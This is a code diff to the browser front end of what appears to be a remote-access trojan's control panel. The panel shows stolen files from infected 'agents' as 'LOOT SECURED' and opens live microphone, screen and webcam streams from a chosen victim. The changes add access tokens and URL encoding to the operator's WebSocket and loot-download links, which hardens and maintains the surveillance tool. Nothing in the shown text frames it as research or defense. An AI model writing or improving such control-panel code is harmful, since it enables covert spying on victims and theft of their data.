@@ -1119,7 +1119,7 @@
         function initSocket() {
             if(window._ws_reconnecting) return;
             const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
-            const ws = new WebSocket(proto + '//' + location.host + '/ws');
+            const ws = new WebSocket(proto + '//' + location.host + '/ws?token=' + encodeURIComponent(token || ''));
             
             socket = {
                 handlers: {},
@@ -1217,7 +1217,7 @@
                 logTerminal(`File uploaded from agent: ${data.filename} (${data.size} bytes)`, 'warn');
                 islandNotify('cloud-arrow-up', `LOOT SECURED: ${data.original || data.filename}`, 'success', 10000, {
                     text: 'DOWNLOAD ZIP/TXT',
-                    callback: () => { window.location = `/api/panel/download_loot?file=${data.filename}&token=${token}`; }
+                    callback: () => { window.location = `/api/panel/download_loot?cid=${encodeURIComponent(data.cid || '')}&file=${encodeURIComponent(data.filename)}&token=${encodeURIComponent(token)}`; }
                 });
             });
         }
@@ -1604,7 +1604,7 @@ function startAudioStream() {
     const canvasCtx = canvas.getContext('2d');
     
     const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
-    const audioWs = new WebSocket(`${proto}//${location.host}/api/panel/stream_ws?cid=${selectedClient}`);
+    const audioWs = new WebSocket(`${proto}//${location.host}/api/panel/stream_ws?cid=${encodeURIComponent(selectedClient)}&token=${encodeURIComponent(token)}`);
     audioWs.binaryType = 'arraybuffer';
 
     audioWs.onopen = () => { statusEl.textContent = 'LISTENING LIVE'; statusEl.style.color = 'var(--success)'; };
@@ -1722,7 +1722,7 @@ function startStream() {
     }, 1000);
 
     const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
-    const streamWs = new WebSocket(`${proto}//${location.host}/api/panel/stream_ws?cid=${selectedClient}`);
+    const streamWs = new WebSocket(`${proto}//${location.host}/api/panel/stream_ws?cid=${encodeURIComponent(selectedClient)}&token=${encodeURIComponent(token)}`);
     streamWs.binaryType = 'arraybuffer';
 
     streamWs.onopen = () => { statusEl.textContent = 'LIVE'; statusEl.style.borderColor = 'var(--success)'; };
@@ -1809,7 +1809,7 @@ function startWebcam() {
     }, 1000);
 
     const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
-    const streamWs = new WebSocket(`${proto}//${location.host}/api/panel/stream_ws?cid=${selectedClient}`);
+    const streamWs = new WebSocket(`${proto}//${location.host}/api/panel/stream_ws?cid=${encodeURIComponent(selectedClient)}&token=${encodeURIComponent(token)}`);
     streamWs.binaryType = 'arraybuffer';
 
     streamWs.onopen = () => { statusEl.textContent = 'LIVE'; statusEl.style.borderColor = 'var(--success)'; };
